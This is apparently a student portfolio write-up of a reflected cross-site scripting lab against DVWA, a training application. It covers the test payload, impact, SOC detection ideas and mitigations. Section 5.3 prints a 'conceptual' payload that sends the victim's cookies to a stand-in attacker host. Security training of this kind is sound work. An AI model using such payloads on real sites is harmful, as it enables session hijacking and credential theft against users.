# 🛡️ Cross-Site Scripting (XSS) Attack in DVWA (Exploitation & Defense Analysis)

---

## 1. Executive Summary

This project demonstrates the exploitation and mitigation of a Cross-Site Scripting (XSS) vulnerability using the Damn Vulnerable Web Application (DVWA). The objective was to simulate a real-world web attack in which malicious scripts are injected into a trusted application and executed in a victim’s browser.

The attack successfully executed JavaScript within the application, confirming that user input was not properly sanitized. This type of vulnerability can lead to session hijacking, credential theft, and unauthorized actions performed on behalf of users.

---

## 2. Environment & Tools

* **Target Application:** DVWA (Damn Vulnerable Web Application)
* **Attack Platform:** Kali Linux
* **Web Stack:** Apache / MySQL / PHP
* **Browser:** Firefox
* **Analysis Type:** Web Application Security Testing

---

## 3. Objective

* Identify XSS vulnerability within DVWA
* Inject and execute malicious JavaScript
* Analyze the impact on user security
* Evaluate detection and mitigation strategies

---

## 4. Vulnerability Overview

Cross-Site Scripting (XSS) occurs when an application includes untrusted user input in its output without proper validation or encoding. This allows attackers to execute scripts in the browser of other users.

Types of XSS:

* Stored XSS (persistent)
* Reflected XSS (non-persistent)
* DOM-based XSS

This lab focuses on **Reflected XSS**, where the payload is executed immediately via user input.

---

## 5. Attack Execution

### 5.1 Initial Testing

The input field was tested with a simple script payload to determine if JavaScript execution was possible.

Example payload:

```html
<script>alert('XSS')</script>
```

---

### 5.2 Exploitation

The payload was submitted through the vulnerable input field. The application reflected the input back to the browser without sanitization.

Observed behavior:

* JavaScript executed successfully
* Alert box displayed in browser
* No input filtering or encoding detected

---

### 5.3 Advanced Impact Demonstration

Beyond simple alerts, XSS can be used to:

* Steal session cookies
* Redirect users to malicious websites
* Capture keystrokes (keylogging)
* Perform actions on behalf of the user

Example (conceptual payload):

```html
<script>document.location='http://attacker-site.com/steal?cookie='+document.cookie</script>
```

---

## 6. Evidence of Exploitation

Indicators confirming successful exploitation:

* Script execution within browser context
* Input reflected without sanitization
* JavaScript interacting with page content

---

## 7. Impact Assessment

If exploited in a real-world application, XSS could lead to:

* Session hijacking
* Credential theft
* Unauthorized actions under user identity
* Delivery of malware to users

**Severity Level:** High

---

## 8. Detection Opportunities (SOC Perspective)

A Security Operations Center (SOC) could detect XSS attempts through:

### Web Server Logs

* Suspicious script tags in URL parameters
* Encoded or obfuscated JavaScript in requests

### Web Application Firewall (WAF)

* Detection of script injection patterns
* Blocking known XSS payloads

### SIEM Monitoring

* Correlation of unusual user behavior
* Alerts for abnormal input patterns

---

## 9. Mitigation Strategies

To prevent XSS vulnerabilities:

* **Input Validation and Sanitization**
* **Output Encoding (HTML, JavaScript contexts)**
* **Content Security Policy (CSP) implementation**
* **Use of secure frameworks that auto-escape output**
* **HTTPOnly and Secure cookie flags**

---

## 10. Key Takeaways

* XSS exploits trust between user and application
* Even simple payloads can demonstrate serious vulnerabilities
* Proper input handling is critical for web security
* Defense requires both coding practices and monitoring

---

## 📌 Project Value

This project demonstrates practical skills in:

* Web vulnerability exploitation
* Understanding client-side attacks
* Security testing methodology
* Defensive security implementation

---
